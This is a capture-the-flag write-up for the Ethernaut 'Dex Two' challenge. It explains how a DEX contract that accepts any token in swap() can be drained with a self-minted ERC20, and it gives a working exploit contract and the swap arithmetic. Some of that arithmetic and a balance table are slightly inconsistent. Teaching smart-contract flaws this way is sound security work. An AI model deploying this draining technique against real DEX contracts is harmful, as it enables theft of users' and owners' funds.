# Writeup for Dex Two

- Hello h4ck3r, welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand Solidity better. Each challenge involves deploying a contract and exploiting its vulnerabilities. If you're new to Solidity and haven't deployed a smart contract before, you can learn how to do so using Remix [here](https://youtu.be/3xNFZI8Ste4?si=i3cWN87OpX85zp6k).

### Challenge Description

This level will ask you to break DexTwo, a subtly modified Dex contract from the previous level, in a different way.

To succeed in this level, you need to drain all balances of token1 and token2 from the DexTwo contract.

You will still start with 10 tokens of token1 and 10 of token2. The DEX contract still starts with 100 of each token.

Things that might help:

How has the swap method been modified?

### Contract Explanation

If you understand the contract, you can move on to the [exploit](#exploit) part. If you're a beginner, please read the Contract Explanation to gain a better understanding of Solidity.

<details>
<summary>Click to view the source contract and contract explanation</summary>

```solidity

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import "openzeppelin-contracts-08/access/Ownable.sol";

contract DexTwo is Ownable {
    address public token1;
    address public token2;

    constructor() {}

    function setTokens(address _token1, address _token2) public onlyOwner {
        token1 = _token1;
        token2 = _token2;
    }

    function add_liquidity(address token_address, uint256 amount) public onlyOwner {
        IERC20(token_address).transferFrom(msg.sender, address(this), amount);
    }

    function swap(address from, address to, uint256 amount) public {
        require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
        uint256 swapAmount = getSwapAmount(from, to, amount);
        IERC20(from).transferFrom(msg.sender, address(this), amount);
        IERC20(to).approve(address(this), swapAmount);
        IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
    }

    function getSwapAmount(address from, address to, uint256 amount) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }

    function approve(address spender, uint256 amount) public {
        SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
        SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
    }

    function balanceOf(address token, address account) public view returns (uint256) {
        return IERC20(token).balanceOf(account);
    }
}

contract SwappableTokenTwo is ERC20 {
    address private _dex;

    constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply)
        ERC20(name, symbol)
    {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
    }

    function approve(address owner, address spender, uint256 amount) public {
        require(owner != _dex, "InvalidApprover");
        super._approve(owner, spender, amount);
    }
}

```

If we compare the `Dex` contract and `DexTwo` contract, we can see that almost everything is the same except for the `swap()` function.

```solidity
function swap(address from, address to, uint256 amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint256 swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
}
```

The difference between the `swap()` function in the `Dex` contract and the `DexTwo` contract is that the `Dex` contract only allows swapping between token1 and token2, while the `DexTwo` contract allows swapping with any tokens. The `Dex` contract has a check `require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");` in the `swap()` function, which ensures that swapping only occurs between the two specified tokens.

Apart from this difference, everything else is the same in the `Dex` and `DexTwo` contracts.

</details>

### Exploit

Since the `swap()` function allows swapping between any tokens, we can create a new ERC20 token and swap it with our token to obtain token1 and token2.

Now, let's examine the `swapAmount` calculation: `((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)))`. When we swap with our token, the `from` parameter will be our token address. Initially, the DexTwo contract won't have any Exploit tokens that we created. Therefore, we need to send the Exploit tokens to the DexTwo contract. If we call `swap()` without sending tokens, the `swapAmount` will be zero because `(amount * IERC20(to).balanceOf(address(this)))/0=0`.

To solve this, we need to mint some Exploit tokens to the DexTwo contract before calling `swap()`. Let's mint 1 token to DexTwo.

Now, we can swap our Exploit token with one of the tokens. However, before doing so, we need to calculate the amount to send such that `getSwapAmount()` will return 100.

Now, DexTwo has `one Exploit token`, `100 token1 tokens`, and `100 token2 tokens`. Let's calculate:

|        | token1 | token2 | Exploit token |
| ------ | ------ | ------ | ------------- |
| DexTwo | 100    | 100    | 1             |

`amount (amount to be transferred) * 100 (Number of token1 tokens in Exploit contract) / 1 (Number of Exploit tokens in Exploit contract) = 100 (swapAmount) => amount * 100 / 1 = 100`, so the amount will be `amount = 100 / 100 = 1`. We need to swap our one Exploit token with 100 token1 tokens.

Once the first swap is completed between our Exploit token and token1 tokens, we need to swap between our Exploit token and token2 tokens.

Now, DexTwo has `two Exploit tokens`, `100 token1 tokens`, and `100 token2 tokens`. Let's calculate the amount:

|        | token1 | token2 | Exploit token |
| ------ | ------ | ------ | ------------- |
| DexTwo | 0      | 100    | 2             |

`amount (amount to be transferred) * 100 (Number of token2 tokens in Exploit contract) / 2 (Number of Exploit tokens in Exploit contract) = 100 (swapAmount) => amount * 100 / 2 = 100`, so the amount will be `amount = 2 / 1 = 2`. We need to swap our two Exploit tokens with 100 token2 tokens.

Once the swap is done, the challenge will be solved.

Before calling `swap()`, we need to make sure that we have approved the DexTwo contract to spend tokens on behalf of our Exploit contract address. This is because when we call `swap()`, it will transfer our Exploit tokens using `transferFrom()`.

We need to approve the DexTwo contract to transfer three tokens on behalf of our Exploit contract: one token for the first swap and two tokens for the second swap.

The following is the Exploit contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IdexTwo {
    function swap(address, address, uint256) external;
    function approve(address , uint256 ) external;
    function balanceOf(address, address) external view returns (uint256) ;
}


contract ExploitDexTwo is ERC20("Exploit","EX"){
    IdexTwo dexTwo;
    address token1=//__YOUR__INSTANCE__TOKEN1__ADDRESS;
    address token2=//__YOUR__INSTANCE__TOKEN2__ADDRESS;
    constructor(address _addr){
        dexTwo=IdexTwo(_addr);
        _mint(address(this),3);
    }


    function Exploit()public{
        _approve(address(this), address(dexTwo),3);
        _mint(address(dexTwo),1);
        dexTwo.swap(address(this),token1,1);
        dexTwo.swap(address(this),token2,2);
    }
}
```

Once you deploy the contract and call the `Exploit()` function, the challenge will be solved.

### Key Takeaways

When building DEX contracts, it is important to ensure that swaps occur only between the expected tokens. Allowing every token for swapping can result in valuable tokens in the DEX contract being swapped with less valuable tokens, leading to losses for the DEX owner.

<p style="text-align:center;">***Hope you enjoyed this write-up. Keep on hacking and learning!***</p>
